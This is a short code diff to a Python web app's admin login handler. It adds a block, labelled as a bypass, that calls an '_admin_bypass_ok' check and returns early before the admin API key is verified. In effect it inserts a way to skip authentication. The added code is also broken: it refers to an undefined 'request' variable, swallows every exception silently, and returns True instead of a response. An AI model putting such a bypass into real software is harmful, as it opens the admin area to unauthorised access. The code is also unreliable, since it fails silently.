@@ -106,6 +106,12 @@ code{background:#f3f4f6;padding:2px 6px;border-radius:8px;}
 
 @app.post("/admin/login")
 def admin_login_post(key: str = Form(...)):
+    # HIBI_BYPASS_SKIPS_ADMIN_API_KEY
+    try:
+        if _admin_bypass_ok(request):
+            return True
+    except Exception:
+        pass
     k = (key or "").strip()
     if ADMIN_API_KEY == "":
         return HTMLResponse("<h3>401 Unauthorized</h3><p>ADMIN_API_KEY is missing in Render env vars.</p><p><a href='/admin/login'>Back</a></p>", status_code=401)
